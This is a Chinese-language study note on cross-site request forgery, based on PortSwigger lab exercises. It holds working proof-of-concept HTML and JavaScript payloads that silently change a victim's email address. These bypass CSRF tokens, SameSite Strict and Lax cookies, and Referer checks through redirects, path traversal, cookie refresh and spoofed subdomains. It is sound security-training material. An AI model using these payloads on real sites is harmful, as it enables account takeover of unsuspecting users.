## Cross-site request forgery

### 什么是跨站请求伪造

跨站请求伪造是一个Web安全漏洞，允许攻击者诱使用户执行他们不打算执行的操作。允许攻击者部分规避同源策略，该策略旨在防止不同网站相互干扰。

在成功的CSRF攻击中，攻击者会导致受害者用户无感知的执行操作。例如，更改邮箱地址、更改密码或进行资金转账。根据操作的性质，攻击者可能能够完全控制用户账户。

### 如何实现跨站请求伪造

- 相关操作：攻击者有理由在应用程序中诱发某个操作。这可能是特权操作（如修改其他用户的权限）或对用户特定数据的任何操作（如更改用户自己的密码）。
- 基于cookie的会话处理。执行该操作涉及发出一个或多个HTTP请求，并且应用程序**仅依靠会话cookie**来识别发出请求的用户。没有其他机制来跟踪会话或验证用户请求。
- 没有不可预知的请求参数。执行该操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，当导致用户更改其密码时，如果攻击者需要知道现有密码的值，则该功能不易受到攻击。

例如，假设应用程序包含一个允许用户更改其账户上的电子邮箱地址的功能。当用户执行此操作时，他们会发出如下所示的HTTP请求：

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

这符合CSRF所需的条件：

- 攻击者对更改用户账户上的电子邮箱地址的操作感兴趣。执行此操作后，攻击者通常能够触发密码重置并完全控制用户账户。
- 应用程序使用会话cookie来识别发出请求的用户。没有其他令牌或机制来跟踪用户会话。
- 攻击者可以轻松确定执行操作所需的请求参数的值。

满足这些条件后，攻击者可以构建包含以下HTML的网页：

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

如果受害用户访问攻击者的网页，将发生以下情况:

- 攻击者的页面将触发对易受攻击的网站HTTP请求
- 如果用户登录到易受攻击的网站，他们的浏览器将自动在请求中包含他们的会话cookie（假设未使用samesite cookie）
- 易受攻击的网站将以正常方式处理请求，将其视为由受害用户发出，并更改其电子邮箱地址。

### 针对CSRF的常见防御

成功发现和利用CSRF漏洞通常涉及绕过目标网站、受害者浏览器或两者部署的反CSRF措施。

- **CSRF TOKEN** CSRF令牌是由服务器端应用程序生成并与客户端共享的唯一、机密且不可预测的值。尝试执行敏感操作（例如提交表单）时，客户端必须在请求中包含正确的CSRF令牌。这使得攻击者很难代表受害者构建有效的请求。
- **SameSite cookie** samesite是一种浏览器安全机制，用于确定网站的cookie何时包含在来自其他网站的请求中。由于执行敏感操作的请求通常需要经过身份验证的会话cookie，因此适当的samesite限制可能会阻止攻击者跨站点触发这些操作。自2021年起，chrome默认强制`Lax`执行samesite限制。
- **Referer-based validation** 基于Referer的验证-某些应用程序利用HTTP Referer头来尝试防御CSRF攻击，通常是验证请求是否来自应用程序自己的域。

### 绕过CSRF token

CSRF token是由服务器端应用程序生成并与客户端共享的唯一、机密且不可预测的值。发出执行敏感操作的请求时，客户端必须包含正确的CSRF token。否则，服务器将拒绝执行请求的操作。

CSRF token的常见缺陷有

- 当请求使用POST方法时，某些应用程序会正确验证token，但是在使用GET方法时会跳过验证。

- CSRF token的验证取决于token是否存在

- CSRF token未绑定用户会话

- CSRF token与非会话cookie相关联

  - >某些应用程序确实将 CSRF token绑定到 cookie，但不绑定到用于跟踪会话的同一 cookie。当应用程序使用两个不同的框架时，很容易发生这种情况，一个用于会话处理，另一个用于 CSRF 保护，这两个框架没有集成在一起：
    >
    >```http
    >POST /email/change HTTP/1.1
    >Host: vulnerable-website.com
    >Content-Type: application/x-www-form-urlencoded
    >Content-Length: 68
    >Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
    >
    >csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
    >```
    >
    >这种情况更难利用，但仍然容易受到攻击。如果**网站包含任何允许攻击者在受害者浏览器中设置 cookie 的行为**，则可能发生攻击。攻击者可以使用自己的帐户登录应用程序，获取有效的令牌和关联的 cookie，利用 cookie 设置行为将其 cookie 放入受害者的浏览器中，并在其 CSRF 攻击中将其令牌提供给受害者。

- CSRF token只在cookie中复制

  - >某些应用程序不维护已颁发令牌的任何服务器端记录，而是在 cookie 和请求参数中复制每个令牌。验证后续请求时，**应用程序只需验证在请求参数中提交的令牌是否与 cookie 中提交的值匹配。**这有时被称为针对 CSRF 的“双重提交”防御，之所以提倡这样做，是因为它易于实现，并且避免了对任何服务器端状态的需求：
    >
    >```html
    >POST /email/change HTTP/1.1
    >Host: vulnerable-website.com
    >Content-Type: application/x-www-form-urlencoded
    >Content-Length: 68
    >Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
    >
    >csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
    >```
    >
    >在这种情况下，如果网站包含任何 cookie 设置功能，攻击者就可以再次执行 CSRF 攻击。在这种情况下，攻击者不需要自己获取有效令牌。他们只需编造一个令牌（如果正在检查，可能是所需的格式），利用 cookie 设置行为将 cookie 放入受害者的浏览器，然后在 CSRF 攻击中将令牌提供给受害者。

### 绕过SameSite Cookie限制

SameSite 是一种浏览器安全机制，用于确定何时将网站的 Cookie 包含在来自其他网站的请求中。SameSite Cookie 限制针对各种跨站点攻击（包括 CSRF、跨站点泄漏和某些 CORS 攻击）提供部分保护。

自 2021 年起，如果发布 Cookie 的网站未明确设置自己的限制级别，Chrome 会默认应用 `Lax` SameSite 限制。这是一个提议的标准，我们预计其他主要浏览器将来也会采用这种行为。因此，必须牢牢掌握这些限制的工作原理，以及如何绕过它们，以便彻底测试跨站点攻击媒介。

在本节中，我们将首先介绍 SameSite 机制的工作原理，并阐明一些相关术语。然后，我们将研究一些最常见的方法可以绕过这些限制，从而对最初可能看起来很安全的网站进行 CSRF 和其他跨站点攻击。

#### **什么是SameSite Cookie上下文中的站点？**

在 SameSite cookie 限制的背景下，网站被定义为顶级域名（TLD），通常是 `.com` 或 `.net` 之类的域名，外加一级域名。这通常被称为 TLD+1。

在确定请求是否为同一站点时，还会考虑 URL scheme。这意味着大多数浏览器将 from `http://app.example.com` to `https://app.example.com` 的链接视为跨站点链接。

![image-20231121152636382](https://raw.githubusercontent.com/m1crofan/image/main/image-20231121152636382.png)

>您可能会遇到 "有效顶级域"（eTLD）一词。这只是对保留的多部分后缀进行说明的一种方式，这些后缀在实践中被视为顶级域，如 `.co.uk`。

从这个例子中可以看出，"`site` "一词的具体含义要少得多，因为它只考虑了域名的方案和最后一部分。重要的是，这意味着跨源请求仍然可以是同站点请求，但反过来就不行了。

| Request from              | Request to                     | Same-site | Same-origin |
| ------------------------- | ------------------------------ | --------- | ----------- |
| `https://example.com`     | `https://example.com`          | Yes       | Yes         |
| `https://app.example.com` | `https://intranet.example.com` | Yes       | No          |
| `https://example.com`     | `https://example.com:8080`     | Yes       | No          |
| `https://example.com`     | `http://example.com`           | No        | No          |

在引入 SameSite 机制之前，浏览器会在每个请求中向发出 Cookie 的域发送 Cookie，即使该请求是由不相关的第三方网站触发的。SameSite 的工作原理是使浏览器和网站所有者能够限制哪些跨站点请求（如果有）应包含特定 Cookie。这有助于减少用户遭受 CSRF 攻击的风险，CSRF 攻击会诱使受害者的浏览器发出请求，从而触发易受攻击网站上的有害操作。由于这些请求通常需要与受害者的身份验证会话关联的 cookie，因此如果浏览器不包含此 cookie，则攻击将失败。

所有主要浏览器当前都支持一些 SameSite 限制级别：

- strict
- Lax
- None

开发人员可以为他们设置的每个 Cookie 手动配置限制级别，从而更好地控制何时使用这些 Cookie。为此，他们只需在 `Set-Cookie` 响应标头中包含 `SameSite` 该属性，以及它们的首选值：

```http
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

尽管这提供了一些针对 CSRF 攻击的保护，但这些限制都无法提供有保证的免疫力，正如我们将在本节后面使用故意易受攻击的交互式实验室来演示的那样。

>如果发布 Cookie 的网站未明确设置 `SameSite` 属性，Chrome 会默认自动应用 `Lax` 限制。这意味着 cookie 仅在满足特定条件的跨站点请求中发送，即使开发人员从未配置过此行为。由于这是一个拟议的新标准，我们预计其他主要浏览器将来也会采用这种行为。

#### 绕过Strict限制

如果使用该 `SameSite=Strict` 属性设置了 cookie，则浏览器不会在任何跨站点请求中发送它。简单来说，这意味着如果请求的目标站点与浏览器地址栏中当前显示的站点不匹配，则**它将不包含 cookie**。

在设置 Cookie 以使持有者能够修改数据或执行其他敏感操作（例如访问仅对经过身份验证的用户可用的特定页面）时，建议这样做。

尽管这是最安全的选项，但在需要跨站点功能的情况下，它可能会对用户体验产生负面影响。

针对`samesite=strict`限制，一种绕过方式是借助开放重定向打组合拳

##### **使用前端重定向绕过strict限制**

就浏览器而言，这些前端重定向**并不是真正意义上的重定向**（是由前端脚本决定的，而不是http交互逻辑30x决定的）；由此产生的请求被视为普通的独立请求。最重要的是，**这是一个同站点请求**，因此会包含与该站点相关的所有 cookies，而不受任何限制。

>[Lab:Bypassing SameSite restrictions using on-site gadgets](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)
>
>这个实验，当评论提交后会跳转到`/post/comment/confirmation?postId=x`，之后会被带回到`post/x`。该过程并不是由http交互逻辑/状态码30x决定的，而是由前端的js脚本实现的；所以浏览器并不会考虑`same-site`的问题。
>
>当我的POC为
>
>```javascript
><script>
>document.location = "https://0a52006003e2ee0c8008a81000270023.web-security-academy.net/my-account/change-email?email=pwssdcnffed%40web-security-academy.net%26submit=1";
></script>
>```
>
>由于浏览器的`samesite=strict`访问并不会带上cookie
>
>![image-20231121173649166](https://raw.githubusercontent.com/m1crofan/image/main/image-20231121173649166.png)
>
>但是当POC为：
>
>```solidity
><script>
>document.location = "https://0a52006003e2ee0c8008a81000270023.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwnffed%40web-security-academy.net%26submit=1";
></script>
>```
>
>该POC借助网站的前端脚本实现跳转以及目录穿越两个组合拳达到绕过`samesite`限制的CSRF效果：使得修改邮箱的请求成功带上了cookie。
>
>![image-20231121174158907](https://raw.githubusercontent.com/m1crofan/image/main/image-20231121174158907.png)

##### 通过易受攻击的同级域绕过strict限制

即使请求是`cross-origin`发出的，依然可以是`same-site`的。

确保彻底审核所有可用的攻击面，包括任何同级域。特别是，能够诱发任意二次请求（如 XSS）的漏洞会完全破坏基于网站的防御，使网站的所有域都受到跨站攻击。

>[Lab: SameSite Strict bypass via sibling domain ](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)
>
>此实验室的实时聊天功能容易受到跨站点Websocket劫持攻击。所以前提是学会websocket相关的漏洞。
>
>这个实验综合性较强，放在后面做

#### 绕过Lax限制

具有`Lax`samesite限制的Cookie通常不会在任何跨站点`POST`请求中发送，但也有一些例外。

如前所述，如果网站在设置 Cookie 时未包含 `SameSite` 属性，Chrome 会默认自动应用 `Lax` 限制。但是，为了避免破坏单点登录 （SSO） 机制，它实际上不会在顶级 `POST` 请求的前 120 秒内强制执行这些限制。因此，有两分钟的窗口期，用户可能容易受到跨站点攻击。

>此两分钟窗口不适用于使用该Samesite=Lax属性显式设置的cookie

尝试将攻击时间安排在这个短暂的窗口内是不切实际的。另一方面，如果你能在网站上找到一个"组合拳"，使你能够强制向受害者发出一个新的会话cookie，你可以在跟进主要攻击之前先发制人地刷新他们的cookie。例如，完成基于 OAuth 的登录流**可能会每次都生成一个新会话**，因为 OAuth 服务**不一定知道用户是否仍登录到目标站点**。

要触发 cookie 刷新而无需受害者再次手动登录，您需要使用顶层导航，以确保包含与当前 OAuth 会话相关的 cookie。这就带来了额外的挑战，因为您需要将用户重定向回您的网站，以便发起 CSRF 攻击。

或者，您可以从新选项卡触发 cookie 刷新，这样浏览器就不会在您进行最终攻击之前离开页面。这种方法的一个小障碍是浏览器会阻止弹出选项卡，除非它们通过手动交互打开。例如，默认情况下，浏览器会阻止以下弹出窗口：

```js
window.open('https://vulnerable-website.com/login/sso');
```

若要解决此问题，可以将语句包装在onclick事件处理程序中

```js
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
}
```

这样，仅当用户单击页面上的某个位置时，才会调用该 `window.open()` 方法。

>[Lab: SameSite Lax bypass via cookie refresh](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh)
>
>这个实验就是利用了当访问`/social-login`回自动启动完整的OAuth流。而每次完成OAuth流时，目标站点都会设置一个新的会话cookie，即使已经登录也是如此。借助这个组合拳，实现绕过chrome默认的LAX限制。
>
>**payload**
>
>```js
><form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
>    <input type="hidden" name="email" value="pwned@portswigger.net">
></form>
><p>Click anywhere on the page</p>
><script>
>    window.onclick = () => {
>        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
>        setTimeout(changeEmail, 5000);
>    }
>
>    function changeEmail() {
>        document.forms[0].submit();
>    }
></script>
>```
>
>**chatgpt**
>
>
>这段 HTML 和 JavaScript 代码似乎是用于模拟一个安全漏洞场景的实例，其中页面上的点击事件（`window.onclick`）触发了一系列操作，包括打开一个新的窗口、等待一段时间后执行 `changeEmail` 函数。
>
>具体步骤如下：
>
>1. **表单定义：**
>
>   ```html
>   <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
>       <input type="hidden" name="email" value="pwned@portswigger.net">
>   </form>
>   ```
>
>   这是一个隐藏的表单，使用 `POST` 方法提交到指定的 URL `'https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email'`。表单包含一个隐藏的输入字段，名称为 `email`，其值为 `"pwned@portswigger.net"`。
>
>2. **点击事件绑定：**
>
>   ```js
>   <script>
>       window.onclick = () => {
>           window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
>           setTimeout(changeEmail, 5000);
>       }
>   
>       function changeEmail() {
>           document.forms[0].submit();
>       }
>   </script>
>   ```
>
>   这部分 JavaScript 代码设置了一个点击事件处理程序。当页面的任意位置被点击时，首先打开了一个新窗口，访问了 `'https://YOUR-LAB-ID.web-security-academy.net/social-login'`。然后，通过 `setTimeout` 函数，等待了5秒钟（5000毫秒），之后调用了 `changeEmail` 函数。
>
>   在 `changeEmail` 函数中，通过 `document.forms[0].submit()` 来自动提交位于页面中的第一个表单，即上述定义的隐藏表单。这样，相当于在5秒钟后自动向指定的 URL 提交了一个带有预设邮箱的 POST 请求。

### 绕过基于Referer的CSRF防御

除了使用CSRF token的防御之外，一些应用程序还利用HTTP`referer` 头尝试防御CSRF攻击，通常是通过验证请求是否来自应用程序自己的域。这种方法通常效果较差，并且经常被绕过。

#### Referer 标头

HTTP Referer头(在HTTP规范中无意中拼写错误)是一个可选的请求头，其中包含链接到所请求资源的网页的URL。当用户触发HTTP请求时，浏览器通常会自动添加她，包括通过单击链接或提交表单。存在各种方法，允许链接页面保存或修改`Referer`头。

- Referer头的验证取决于头是否存在

  >某些应用程序会在`referer`头种存在时对其进行验证，但如果省略头，则跳过验证。
  >
  >在这种情况下，攻击者可以构建其CSRF漏洞，导致受害用户得浏览器在生成得请求中删除Referer头。有多种方式可以实现这一点，但最简单得方式是在托管CSRF攻击得HTML页面中使用META标记：
  >
  >该属性需要添加到HTML`head`头中
  >
  >```html
  ><meta name="referrer" content="never">
  >```
  >
  >`<meta name="referrer" content="never">` 的作用是指定在浏览器向其他站点发送请求时，不要包含当前页面的引用信息（referrer）。Referrer 是指向当前页面的链接，通常包含在 HTTP 请求头中，告诉被请求页面从哪个页面链接而来。

- 可以规避Referer的验证

  >某些应用程序以可绕过的简单方法验证Referer。例如，如果应用程序验证中Referer域**是否以预期值开头**，则攻击者可以将其作为其自己域的子域：
  >
  >```url
  >http://vulnerable-website.com.attacker-website.com/csrf-attack
  >```
  >
  >同样，如果应用程序只是验证**是否**Referer**包含自己的域**，则攻击者可以将所需的值放在URL中的其他位置：
  >
  >```url
  >http://attacker-website.com/csrf-attack?vulnerable-website.com
  >```
  >
  >尽管可以使用Burp识别这个漏洞，但当在浏览器中验证POC时候，经常会发现这种方法不再有效。为了降低以这种方式泄露敏感数据的风险，许多浏览器现在默认从`Referer`头中剥离查询字符串。
  >
  >我们可以通过确保包含漏洞的响应设置了`Referrer-Policy：unsafe-url`来覆盖浏览器的这种方式。
  >
  >```html
  ><html>
  >  <!-- CSRF PoC - generated by Burp Suite Professional -->
  >  <body>
  >  <script>history.pushState('', '', '/?0a1e006a0389aa2780290823001f00e1.web-security-academy.net')</script>
  >    <form action="https://0a1e006a0389aa2780290823001f00e1.web-security-academy.net/my-account/change-email" method="POST">
  >      <input type="hidden" name="email" value="17755dd6623&#64;gmail&#46;com" />
  >      <input type="submit" value="Submit request" />
  >    </form>
  >  </body>
  >	<script>document.forms[0].submit();</script>
  ></html>
  >```
  >
  >其中history.pushState()是HTML5中提供的一个浏览器API，允许在不刷新整个页面的情况下通过js修改浏览器地址栏的URL和当前的历史条目。
  >
  >```javascript
  >history.pushState(state, title, url);
  >```
  >
  >`url`: 新的历史记录条目的 URL。注意，这个 URL 应该是相对于当前页面的，而不是绝对 URL。



